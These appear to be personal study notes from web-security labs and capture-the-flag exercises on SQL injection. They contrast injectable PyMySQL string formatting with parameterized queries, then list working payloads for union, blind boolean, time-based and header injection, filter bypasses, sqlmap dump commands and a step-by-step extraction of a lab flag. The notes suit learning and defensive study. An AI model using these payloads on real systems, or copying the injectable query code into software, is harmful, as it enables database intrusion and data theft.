## Secure PyMySQL Library ! 
Case1:
```python
def user_exists(username: str) -> bool:
	with connection.cursor() as cursor:
		cursor.execute("""
			SELECT
				Id
			FROM
				users
			WHERE
				username = '%s'
		"""% username)
		result = cursor.fetchone()
	id, = result
	return id
#with connection.cursor() as cursor:
		#cursor.execute(x) it have an arguman
```
Attack:
```python
user_exists('test') #False
#select id from users where username = 'test'

user_exists("'; select 1=1; -- ") #True
#select id from users where username = ''; select true; -- '
```
Case2:
```python
def user_exists(username: str) -> bool:
	with connection.cursor() as cursor:
		cursor.execute("""
			SELECT
				Id
			FROM
				users
			WHERE
				username = '%s'
		""" % username. replace("'", "''") )
		result = cursor. fetchone()
	id, = result
	return id
```
Attack:
```python
user_exists("'; select 1=1; --") #False
#select id from users where username = '''; select true; -- '

user_exists("\'; select 1=1; --") #True
#select id from users where username = '\''; select true; -- '
#select id from users where username = 'x'; select true; -- '
```
Case3:
```python
def user_exists(username: str) -> bool:
	with connection.cursor() as cursor:
		cursor.execute("""
			SELECT
				Id
			FROM
				users
			WHERE
				username = %(username)s
		""", {'username': username})
		result = cursor.fetchone()
	id, = result
	return id
#The attack?
#According to the https://github.com/PyMySQL/PyMySQL/blob/master/pymysql/cursors.py#L156
#The args go to the mogrify( ) then_escape_args()
#So there won't be SQLi
```
## payloads:
https://github.com/payload-box/sql-injection-payload-list.git
```sql
select * from credentials where username = 'Susername' and password = '$password'
'username: mamad'--'

SELECT * FROM users where username='test' AND password = '098f6bcd4621d373cade4e832627b4f6'
'test' or 1=1--'

select * from news where news_id = $NEWSID;
select * from news where news_id = '$NEWSID';
select * from news where news_id = "$NEWSID";	
select if ((select count from products where product_id = $PRODUCT_ID) > 0, 1, 0) 
-- 0 or 1
INSERT INTO table_name VALUES (value1, value2, ... );
```
So we can pull out the data needed from ==information_schema== database:
```sql
select schema_name from information_schema.schemata
--shows all database which the user has access to
select table_name from information_schema.tables
--shows all tables which the user has access to
select column_name from information_schema.columns
--shows all columns which the user has access to
```
Various filters can be applied here, for example Query below returns only column names for a specific database and table:
```sql
select group_concat(column_name) from information_schema.columns where table_schema='DATABASE_NAME' and table_name='TABLE_NAME'
```
Union Based Injection
```sql
Default request:
page/?id=54

Test 1:
page/?id=54  order by 1
'page/?id=54' order by 1-- 
"page/?id=54" order by 1-- 

Test 2:
page/?id=54  order by 1000
'page/?id=54' order by 1000 --
"page/?id=54" order by 1000 --"
-- We can confirm the SQLi when results of:
- Default == Test 1
- Test 1 ≠ Test 2
```
**point**
```sql
UNION -> SELECT
UNION -!> INSERT(BLIND)

SELECT * FROM secrets WHERE session_id = '$_POST['session_id' ]'
SELECT * FROM secrets WHERE session_id = '123'
SELECT * FROM secrets WHERE session_id = '' or true--'

SELECT * FROM secrets; DELETE * FROM secrets; --batch query

PHP + MySQL = No batch query
SQLServer + .Net = Batch query
```
sql
```sql
'test' union select 1,user() --'

'a' union select group_concat(table_name) from information_schema.tables where table_schema=database()--' ->my_secret_table and users

'a' union select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='my_secret_table'--' ->flag

'a' union select flag from my_secret_table
```
Time base always is good
```sql
''+sleep(5)--'
```
real word:DOD
```sql
--')AND+22=22+AND+('NaXY'+LIKE+'NaXY
--')AND+22=22#

--Payload: ' and 1=1#
SELECT * FROM search_engine WHERE title LIKE '%HERE%'
SELECT * FROM search_engine WHERE title LIKE '%' and 1=1--%'

--Payload: " and 1=1#
SELECT * FROM search_engine WHERE title LIKE "%HERE%"
SELECT * FROM search_engine WHERE title LIKE "%" and 1=1--%"

--Payload: ') and 1=1#
SELECT * FROM search_engine WHERE title in ('HERE')
SELECT * FROM search_engine WHERE title in ('') and 1=1--')
```
everything:
```sql
step 1 = Type identification (blind boolean)
step 2 = Yahoo' and 1=1#
step 3 = Yahoo' and 1=2#
step 4 = Yahoo' and 1=if(length(database()) > 6,1,0)#
step 5 = Yahoo' and (select substring(database(), 1, 1)) = 'L'# i find database name (level3)
step 6 = Yahoo' and (select count(*) from information_schema. tables where table_schema=database())=3# i find 2 table number
step 7 = Yahoo' and (select length(table_name) from information_schema. tables where table_schema=database() limit 0,1) >14# 1 table length
step 8 = Yahoo' and (select length(table_name) from information_schema. tables where table_schema=database() limit 1,1) >5# 2 table length
step 9 = Yahoo' and substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1) = 's'# i find
(search_engine , users)
step 10 = Yahoo' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name='users') >1# i
find 2 column
step 11 = Yahoo' and (select length(column_name) from information_schema.columns where table_schema=database() and table_name='users' limit
0,1) >2# column 1 length (8) and column 2 length (8)
step 12 = Yahoo' and substring((select column_name from information_schema.columns where table_schema=database() and table_name='users'
limit 0,1),1,1) = 's'# (username , password)
step 13 = Yahoo' and (select length(username) from users limit 1)=2# -> 13
step 14 = Yahoo' and (select length(password) from users limit 1)=2# > 37
step 15 = Yahoo' and substring((select password from users limit 1),1,1) = 's'# find flag (flag-dad50ccc5b4e578f4ac050cd9fc39175)
---film 120
```
like and -
```sql
SELECT * FROM movies WHERE year_released LIKE '200_';
--2002 film1
--2008 film2
```
sqli where
```html
user-agent
cookie
x-forwarded-for
```
URL example 
```html
1. GET / HTTP/1.1
2. Host: 77.238.121.150:13022
3. User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0' like
if((substring(database(),1,1)='e',sleep(5),0) and '1'='1
4. Cookie: csrftoken=
K9xCb6FF3wUSbqnChIZsFLIcb2IUDPDN11I4oTqonpIGWtwHbvthpoJJ30BKZPZO;
PHPSESSID=f27367b8f7ec6aec2931c67025faa2af
5. Upgrade-Insecure-Requests: 1
```
بعضى وقت ها نميشه از union , select استفاده كرد, جطور مى تونيم باييس كنيم
```sql
select -> Select
select -> selecselectt
select -> %Oaselect
```
sqlmap
```shell
#filename=level2
python3 sqlmap.py -r level2 -p username --batch --dbms=mysql
#database
python3 sqlmap.py -r level2 --dbs
#everything
python3 sqlmap.py -r level2 -D level2 --dump --batch
```
## oracle
```sql
'Accessories' UNION SELECT 'abc', 'def' FROM dual --' port3
'Accessories' UNION SELECT banner , 'def' FROM v$version --' port3
```
port4
```sql
'category=Gifts'+UNION+SELECT+NULL,NULL--#'
'category=Gifts'+UNION+SELECT+NULL,@@version--#'
```
live10-4
HERE :
```sql
SELECT * FROM search_engine WHERE title LIKE 'HERE' OR description LIKE 'HERE' OR link LIKE 'HERE';
```
\ :
```sql
SELECT * FROM search_engine WHERE title LIKE '\' OR description LIKE '\' OR link LIKE '\';
SELECT * FROM search_engine WHERE title LIKE 'mamad'\'mamad'\';
```
--\ :
```sql
SELECT * FROM search_engine WHERE title LIKE '--\' OR description LIKE '--\' OR link LIKE '--\';
SELECT * FROM search_engine WHERE title LIKE 'mamad'--
```
or 1=1 --\
```sql
SELECT * FROM search_engine WHERE title LIKE ' or 1=1 --\' OR description LIKE ' or 1=1 --\' OR link LIKE ' or 1=1 --\';
SELECT * FROM search_engine WHERE title LIKE 'mamad' or 1=1 --
```
union
```sql
UNION SELECT 1,2,3 --\
UNION SELECT database(),user(),group_concat(table_name) from information_schema.tables where table_schema=database() --\
UNION SELECT database(),user(),group_concat(table_name) from information_schema.tables where table_schema=0x..... --\Hex database
```
hex
```shel
echo level6 | xxd
```
## portswigger
